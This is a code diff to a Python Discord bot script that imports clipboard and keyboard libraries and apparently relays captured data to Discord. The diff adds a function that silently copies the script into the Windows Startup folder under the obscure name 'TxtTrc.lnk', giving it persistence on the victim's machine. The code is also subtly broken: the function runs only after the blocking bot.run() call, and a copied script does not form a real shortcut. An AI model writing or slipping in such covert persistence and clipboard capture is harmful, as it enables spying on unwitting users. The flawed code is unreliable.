@@ -2,6 +2,9 @@ import discord
 import pyperclip
 import time
 import keyboard
+import os
+import shutil
+import sys
 
 # Replace 'your_token_here' with your actual bot token
 TOKEN = 'your_token_here'
@@ -33,3 +36,21 @@ async def on_ready():
         time.sleep(1)  # Adjust the interval as needed
 
 bot.run(TOKEN)
+
+def add_to_startup():
+    # Get the path to the current script
+    script_path = os.path.abspath(sys.argv[0])
+    
+    # Get the user's startup folder
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    
+    # Define the name of the new shortcut
+    shortcut_name = 'TxtTrc.lnk'
+    shortcut_path = os.path.join(startup_folder, shortcut_name)
+    
+    # Check if the script is already in the startup folder
+    if not os.path.exists(shortcut_path):
+        # Create a shortcut to the script
+        shutil.copy(script_path, shortcut_path)
+        
+add_to_startup()
